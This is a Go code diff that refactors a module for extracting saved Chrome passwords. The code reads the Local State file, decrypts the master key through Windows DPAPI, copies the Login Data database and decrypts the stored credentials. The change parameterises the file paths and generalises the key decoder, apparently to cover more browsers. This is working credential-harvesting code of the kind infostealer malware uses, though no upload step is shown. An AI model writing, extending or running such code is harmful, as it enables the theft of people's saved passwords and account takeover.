@@ -15,9 +15,8 @@ import (
 )
 
 var (
-	APPDATA string = os.Getenv("LOCALAPPDATA");
-	CHROME_PATH_LOCAL_STATE = fmt.Sprintf("%s/Google/Chrome/User Data/Local State", APPDATA);
-	CHROME_PATH_LOGIN_DATA = fmt.Sprintf("%s/Google/Chrome/User Data/Default/Login Data", APPDATA);
+	CHROME_PATH_LOCAL_STATE = fmt.Sprintf("%s/Google/Chrome/User Data/Local State", LOCALAPPDATA);
+	CHROME_PATH_LOGIN_DATA = fmt.Sprintf("%s/Google/Chrome/User Data/Default/Login Data", LOCALAPPDATA);
 )
 
 
@@ -27,13 +26,14 @@ func Chrome() BrowserConfig{
 		Credentials: []Credential{},
 	};
 
-	secretKey, err := getSecretKey();
+	secretKey, err := getSecretKey(CHROME_PATH_LOCAL_STATE);
 	if err != nil {
 		fmt.Println(err.Error());
 		return credentials;
 	}
-	err = getLoginData(secretKey, &credentials);
+	err = getLoginData(CHROME_PATH_LOGIN_DATA, secretKey, &credentials);
 	if err != nil {
+		fmt.Println(err.Error())
 		return credentials;
 	}
 
@@ -43,9 +43,9 @@ func Chrome() BrowserConfig{
 // ****************************************************
 // GET SECRET KEY
 // ****************************************************
-func getSecretKey() ([]byte, error) {
+func getSecretKey(localStatePath string) ([]byte, error) {
 	// Read the Local State file
-	localState, err := os.ReadFile(CHROME_PATH_LOCAL_STATE)
+	localState, err := os.ReadFile(localStatePath)
 	if err != nil {
 		return nil, err
 	}
@@ -71,7 +71,7 @@ func getSecretKey() ([]byte, error) {
 		return nil, err;
 	}
 
-	decryptedKeyBytes, err := decodeChromeKey(encryptedKeyBytes[5:]);
+	decryptedKeyBytes, err := decodeBrowserKey(encryptedKeyBytes[5:]);
 	if err != nil {
 		return nil, err;
 	}
@@ -84,7 +84,7 @@ func getSecretKey() ([]byte, error) {
 	return decryptedKeyBytes, nil
 }
 
-func decodeChromeKey(encryptedKey []byte) ([]byte, error) {
+func decodeBrowserKey(encryptedKey []byte) ([]byte, error) {
 	decryptedKey, err := dpapi.DecryptBytes(encryptedKey);
 	return decryptedKey, err;
 }
@@ -132,7 +132,7 @@ func decryptPassword(ciphertext string, secretKey []byte) (string, error) {
 // ****************************************************
 // GET LOGIN DATA
 // ****************************************************
-func getLoginData(secretKey []byte, credentials *BrowserConfig) error {
+func getLoginData(loginDataPath string, secretKey []byte, credentials *BrowserConfig) error {
 	// copy the Login Data sqlite3 file to a temp file
 	tempFile, err := os.CreateTemp("", "chrome_login_data_*.db");
 	if err != nil {
@@ -140,7 +140,7 @@ func getLoginData(secretKey []byte, credentials *BrowserConfig) error {
 		return err;
 	}
 	defer os.Remove(tempFile.Name());
-	fileBytes, err := os.ReadFile(CHROME_PATH_LOGIN_DATA);
+	fileBytes, err := os.ReadFile(loginDataPath);
 	if err != nil {
 		fmt.Println(err.Error());
 		return err;
